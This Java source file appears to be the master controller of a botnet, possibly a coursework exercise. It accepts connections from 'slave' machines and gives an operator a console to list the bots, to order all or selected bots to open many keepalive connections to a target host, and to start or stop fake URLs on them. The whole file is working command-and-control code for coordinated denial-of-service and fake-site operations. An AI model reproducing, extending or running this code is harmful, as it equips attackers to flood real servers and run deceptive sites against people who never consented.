import java.util.*;
import java.io.PrintWriter;
import java.io.IOException;
import java.net.*;
import java.time.LocalDateTime;

public class MasterBot implements Runnable {
	
	/* Reference to an external array list of slaves */
	ArrayList <Socket> slaveList;
	private int portNumber;
	public int getPortNumber() {
		
		return portNumber;
	}
	
	public MasterBot(ArrayList<Socket> slaveList, int portNumber) {
		this.slaveList = slaveList;
		this.portNumber = portNumber;
	}
	
	public void setPortNumber(int p) {
		portNumber = p;
	}
	
	/*
	 * Runnable Thread to listen to slave and accept the connection
	 */
	public void run() {
		//System.out.println("Started new thread");
				try {
					int numSlaves = 0;
					if (slaveList == null) {
						System.err.println("Error null slaveList");
						return;
					}
					Socket socketNew;
					ServerSocket listner = new ServerSocket(portNumber);
					while (true) {
						socketNew = listner.accept();
						slaveList.add(socketNew);
						++numSlaves;
						//System.out.println("Accepted a new connection: " + numSlaves);						
					}
				} catch (IOException e) {
					e.printStackTrace();
					System.err.println("Error in listening-Master");
				}
	}
	
	/*
	 * Printing the list of slaves
	 */
	public void printSlaves(){
		System.out.printf("%-15s %-15s %-15s %-15s %n","SlaveHostName","IPAddress","PortNo","RegDate");	
		String[] slaveStr;
		for(Socket slave : slaveList){
			slaveStr = slave.getRemoteSocketAddress().toString().split("/");
			slaveStr = slaveStr[1].split(":");
			System.out.printf("%-15s %-15s %-15s %-15s %n",slave.getInetAddress().getHostName(),
					slaveStr[0],
					slaveStr[1],
					getRegistrationDate());			
		}
	}
	/*
	 * Writing data to slave socket
	 */
	public void writeSocketData(Socket s, String data) 
	{		
		try {
			PrintWriter out;
			out = new PrintWriter(s.getOutputStream(), true);
			out.println(data);
		} catch (IOException e) {
			e.printStackTrace();
		}
	}
	
	/* Write data to slave socket(s) */
	public void writeToSlaveSocket(String slaveIpOrHostName, String data)
	{
		String[] slaveStr;
		String slaveIp;
		String slaveHostName;
		/* Search for slave socket */
		for (Socket slave : slaveList) {
			slaveStr = slave.getRemoteSocketAddress().toString().split("/");
			slaveStr = slaveStr[1].split(":");
			slaveIp = slaveStr[0];
			slaveHostName = slave.getInetAddress().getHostName();
			if (slaveIpOrHostName.equals(slaveIp) || slaveIpOrHostName.equals(slaveHostName)) {
				/* Write data to this slave */
				System.out.println("Writing data to slave: " + slave.getRemoteSocketAddress().toString());
				writeSocketData(slave, data);
			}
		}
	}
	
	/* Write data to all slave socket(s) */
	public void writeToAllSlaveSockets(String data)
	{
		for (Socket slave : slaveList) {
			writeSocketData(slave, data);
		}
	}	
	
	/*
	 * To connect the host
	 */
	public void connectTargetHost(String cmd[])
	{
		boolean all = false;
		String slaveIpOrHostName = null;
		String targetHostNameOrIp = cmd[2];
		String targetPort = cmd[3];
		String data = null;
		String keepalive = "0";
		String url_cmd = null;
		String numConnections = null;
		for (String c : cmd) {
			//System.out.println("cmd: " + c);
			switch(c) {
			case "keepalive": 	keepalive = "1";
								break;
			}
			if (c.contains("=")) {
				//System.out.println("url = " + c.substring(4));
				url_cmd = c.substring(4);
			}
		}
		
		if (cmd.length > 4) {
			try {
				Integer.parseInt(cmd[4]);
			} catch (NumberFormatException e) {
				numConnections = "1";
			} catch (NullPointerException e) {
				numConnections = "1";
			}
			if (numConnections == null) {
				numConnections = cmd[4];
			}
		} else {
			numConnections = "1";
		}

		
		data = "connect:" + targetHostNameOrIp + ":" + targetPort + ":" + numConnections + ":" + keepalive;
		//System.out.println("Writing data to slaves: " + data);
		if (url_cmd != null) {
			data = data + ":" + url_cmd;
		}
		
		if (cmd[1].equalsIgnoreCase("all")) {
			all = true;
		} else {
			slaveIpOrHostName = cmd[1];
		}
		
		if (all) {
			writeToAllSlaveSockets(data);
		} else {
			writeToSlaveSocket(slaveIpOrHostName, data);
		}
		
	}
	
	/*
	 * To disconnect the host
	 */
	public void disconnectTargetHost(String cmd[]) 
	{
		System.out.println("DisConnecting");
		String slaveHostOrIp = cmd[1];
		System.out.println("Slave host ip "+slaveHostOrIp);
		String targetHostOrIp = cmd[2];
		System.out.println("target host "+targetHostOrIp);
		String data;
		int port_number=0;
		
		//If port number is given by user, store it else ignore the port
		if(cmd.length == 4){
			port_number = Integer.parseInt(cmd[3]);
		//	System.out.println("port present "+ port_number);
		}
		
		if(port_number>0){
			data = "disconnect" + ":" + targetHostOrIp + ":" + port_number;
			System.out.println(data);
		}
		else{
			data = "disconnect" + ":" + targetHostOrIp; 
		//	System.out.println(data);
		}
	
		//Writing to all slaves if Ip/hostname of slave not mentioned
		if(slaveHostOrIp.equalsIgnoreCase("all")){
			writeToAllSlaveSockets(data);		
		}
		else{
			writeToSlaveSocket(slaveHostOrIp, data);
		}
		
		//Writing to slave to disconnect, if host name is specified else write data to all slaves
		
	}
	/*
	 * Getting the registration date
	 */
  public String getRegistrationDate(){
	  
	  LocalDateTime now =LocalDateTime.now();
	  String regDate;
	  int day = now.getDayOfMonth();
	  int month = now.getMonthValue();
	  int year = now.getYear();
	  if(String.valueOf(day).length()==1){
		  regDate = year+"-"+month+"-"+ "0"+day;	
	  }
	  else{
		  regDate = year+"-"+month+"-"+day;	
	  }
	    
	  return regDate;		
	}
  /*
   * Takes portnumber and url as input
   */
  public void riseFakeURL(String cmd[]){
	  int portNumber;
	  String url,data;
	  if(cmd.length != 3){
		  System.err.println("Command not entered in correct format. Please enter the arguments portnumber and url");
		  //System.exit(1);
	  }
	  portNumber = Integer.parseInt(cmd[1]);
	  url = cmd[2];  //Should i check for www.?
	  
	  if(portNumber <=0){
		  System.err.println("Port Number not entered properly");
		  System.exit(1);
	  }
	  
	  data = "rise-fake-url:" + portNumber + ":" + url;
	  writeToAllSlaveSockets(data);
	  
  }
  /*
   * 
   */
  
  public void downFakeURL(String cmd[]){
	 
	  int portNumber;
	  String url,data;
	  if(cmd.length != 3){
		  System.err.println("Command not entered in correct format. Please enter the arguments portnumber and url");
		  System.exit(1);
	  }
	  
	  portNumber = Integer.parseInt(cmd[1]);
	  url = cmd[2];  //Should i check for www.?
	  if(portNumber <=0){
		  System.err.println("Port Number not entered properly");
		  System.exit(1);
	  }
	  data = "down-fake-url:" + portNumber + ":" + url;
	  writeToAllSlaveSockets(data);
	  
  }
	
	/*
	 * Lists all the slaves in the following format
	 * SlaveHostName IPAddress SourcePortNumber RegistrationDate
	 *
	 */
	
	//Main

	public static void main(String[] args) {
		
		int portNumber = 0;
		ArrayList<Socket> slaves = new ArrayList<Socket>();
		
		//new Thread(new MasterBot(slaves))
		
		/*Accepting command line argument and storing it in portNumber. 
		One port number must be entered.*/
		if(args.length == 0){
			System.err.println("One port number must be entered. Exiting Master");
			System.out.println("\n");
			System.exit(1);
		}
		//To do: Try Catch
		if(args.length == 2){	
			if((args[0].equals("-p")) && (Integer.parseInt(args[1]))>0){
				//master.setPortNumber(Integer.parseInt(args[1]));
				portNumber = Integer.parseInt(args[1]);
				System.out.println(args[1]);
			}
			else{
				System.err.println("Data entered not correct");
				System.exit(1);
			}
		}
		
			else{
				System.err.println("portnumber must be entered in correct format");
				System.exit(1);
			}																																															
		//Adding slaves to array while connecting
		MasterBot master = new MasterBot(slaves, portNumber);
		
		// Spawn off a thread to listen for slaves
		new Thread(master).start();

		//Creating a new input stream object
		Scanner sc = new Scanner(System.in);
		while(true) {
			//Printing the commands to enter			
			System.out.println("Please enter any of the following commands");
			System.out.println("1.list \n"
					+ "2.connect \n"
					+ "3.disconnect \n" 
					+ "4.rise-fake-url \n"
					+ "5 down-fake-url \n");
			System.out.print('>');
			
			/* Get UI input */
			String input = sc.nextLine().toLowerCase();
			System.out.println(" Input :" + input);
			String cmd[] = input.split(" ");
			for (String str : cmd) {
				System.out.println(str);
			}
			System.out.println("Switching cmd[0]" + cmd[0]);
			switch(cmd[0]) {
				case "list":		master.printSlaves();
									break;
				case "connect":		master.connectTargetHost(cmd);
									break;
				case "disconnect":	master.disconnectTargetHost(cmd);
									break;
				case "rise-fake-url" : 	master.riseFakeURL(cmd);
										break;
				case "down-fake-url" :  master.downFakeURL(cmd); 
										break;
				default:			System.out.println("Incorrect input");
			}
			
		}	
	}
}

